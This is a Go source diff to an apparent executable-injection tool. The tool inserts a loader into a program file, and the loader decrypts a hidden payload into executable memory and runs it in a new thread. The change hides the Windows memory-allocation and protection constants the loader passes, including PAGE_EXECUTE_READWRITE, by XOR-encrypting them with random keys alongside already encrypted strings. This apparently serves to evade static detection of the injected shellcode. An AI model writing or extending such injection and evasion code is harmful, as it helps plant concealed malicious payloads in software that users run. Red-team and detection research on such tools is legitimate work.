@@ -32,6 +32,14 @@ const (
 	reservedLoaderSize = 4096
 )
 
+const (
+	paAllocationType = "AllocationType"
+	paProtect        = "Protect"
+	paNewProtect     = "NewProtect"
+	paInfinite       = "Infinite"
+	paFreeType       = "FreeType"
+)
+
 // The role of the payload loader is used to decrypt payload
 // in the tail section to a new RWX page, then create thread at
 // the decrypted payload(default loader template).
@@ -113,6 +121,10 @@ type loaderCtx struct {
 	WaitForSingleObjectDB  []int64
 	WaitForSingleObjectKey []int64
 
+	// store encrypted procedure arguments
+	PAData map[string]uint64
+	PAKey  map[string]uint64
+
 	// store procedure IAT offset
 	LoadLibrary         uint64
 	GetProcAddress      uint64
@@ -183,13 +195,16 @@ func (inj *Injector) buildLoaderASM(src string, payload []byte, ins bool) (strin
 		RegN: inj.buildNonvolatileRegisterMap(),
 		Args: inj.opts.Arguments,
 
-		EntryOffset:   entryOffset,
-		MemRegionSize: memRegionSize,
-		PayloadSize:   len(payload),
+		PAData: make(map[string]uint64),
+		PAKey:  make(map[string]uint64),
 
 		CodeCave:      inj.opts.ForceCodeCave,
 		ExtendSection: inj.opts.ForceExtendSection,
 		CreateSection: inj.opts.ForceCreateSection,
+
+		EntryOffset:   entryOffset,
+		MemRegionSize: memRegionSize,
+		PayloadSize:   len(payload),
 
 		EndOfLoader: endOfShellcode,
 	}
@@ -202,6 +217,7 @@ func (inj *Injector) buildLoaderASM(src string, payload []byte, ins bool) (strin
 		return "", err
 	}
 	inj.encryptStrings(ctx)
+	inj.encryptArguments(ctx)
 	// update context
 	hasLoadLibraryA := inj.getProcFromIAT("LoadLibraryA") != nil
 	hasLoadLibraryW := inj.getProcFromIAT("LoadLibraryW") != nil
@@ -453,8 +469,8 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 		}
 		str += strings.Repeat("\x00", num)
 		for i := len(str) - 4; i >= 0; i -= 4 {
-			v := binary.LittleEndian.Uint32([]byte(str[i:]))
-			k := inj.rand.Uint32()
+			v := int32(binary.LittleEndian.Uint32([]byte(str[i:]))) // #nosec G115
+			k := inj.rand.Int31()
 			val = append(val, int64(v^k))
 			key = append(key, int64(k))
 		}
@@ -471,6 +487,41 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 			val = append(val, v^k)
 			key = append(key, k)
 		}
+	}
+	return val, key
+}
+
+func (inj *Injector) encryptArguments(ctx *loaderCtx) {
+	for _, item := range [...]struct {
+		name  string
+		value uint32
+	}{
+		{name: paAllocationType, value: 0x3000}, // MEM_RESERVE|MEM_COMMIT
+		{name: paProtect, value: 0x04},          // PAGE_READWRITE
+		{name: paNewProtect, value: 0x40},       // PAGE_EXECUTE_READWRITE
+		{name: paInfinite, value: 0xFFFFFFFF},   // INFINITE
+		{name: paFreeType, value: 0x8000},       // MEM_RELEASE
+	} {
+		data, key := inj.encryptArgument(item.value)
+		ctx.PAData[item.name] = data
+		ctx.PAKey[item.name] = key
+	}
+}
+
+func (inj *Injector) encryptArgument(value uint32) (uint64, uint64) {
+	var (
+		val uint64
+		key uint64
+	)
+	switch inj.arch {
+	case "386":
+		k := inj.rand.Int31()
+		val = uint64(int32(value) ^ k)
+		key = uint64(k)
+	case "amd64":
+		k := inj.rand.Uint64()
+		val = uint64(uint64(value) ^ k)
+		key = uint64(k)
 	}
 	return val, key
 }
